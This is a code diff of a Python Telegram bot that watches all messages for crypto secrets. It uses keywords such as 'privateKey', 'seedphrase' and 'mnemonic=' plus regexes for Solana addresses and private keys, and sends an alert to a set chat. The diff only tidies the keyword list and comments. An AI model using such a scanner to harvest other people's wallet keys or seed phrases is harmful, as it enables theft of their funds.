@@ -7,16 +7,23 @@ from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTyp
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# ===== CONFIG =====
-KEYWORDS = ["mint", "privateKey", 'seenphrase", "token", "private_key=", "seed phrase=", "mnemonic=", "api_key="]
+# ===== KEYWORDS CORREGIDAS =====
+KEYWORDS = [
+    "mint",
+    "privateKey",
+    "seedphrase",
+    "token",
+    "private_key=",
+    "seed phrase=",
+    "mnemonic=",
+    "api_key="
+]
 
 # ===== REGEX =====
 SOLANA_REGEX = r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"
 PRIVATE_KEY_REGEX = r"\b([A-Fa-f0-9]{64}|[1-9A-HJ-NP-Za-km-z]{64,})\b"
 JSON_KEY_REGEX = r'("privateKey"\s*:\s*".+?"|"secret"\s*:\s*".+?")'
 
-
-# ===== FUNCIONES =====
 
 def extract_code_blocks(text, entities):
     if not text or not entities:
@@ -72,8 +79,6 @@ def should_alert(message):
     return False, None, None
 
 
-# ===== HANDLER =====
-
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
 
@@ -96,10 +101,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("✅ Alerta enviada")
 
 
-# ===== MAIN =====
-
 app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-
 app.add_handler(MessageHandler(filters.ALL, handle_message))
 
 print("🤖 Bot activo...")
